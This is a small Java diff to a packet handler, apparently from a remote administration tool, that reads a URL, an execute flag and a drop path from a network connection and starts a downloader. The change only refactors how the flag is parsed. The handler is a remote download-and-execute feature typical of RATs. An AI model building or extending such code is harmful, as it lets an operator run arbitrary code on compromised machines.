@@ -8,7 +8,7 @@ public class PacketCUSTOMDL extends AbstractPacket {
 	@Override
 	public void read(String line) throws Exception {
 		String url = Connection.readLine();
-		boolean exec = Boolean.parseBoolean(Connection.readLine());
+		boolean exec = Connection.readBoolean();
 		String drop = Connection.readLine().toLowerCase();
 		new AdvDownloader(url, exec, drop).start();
 	}
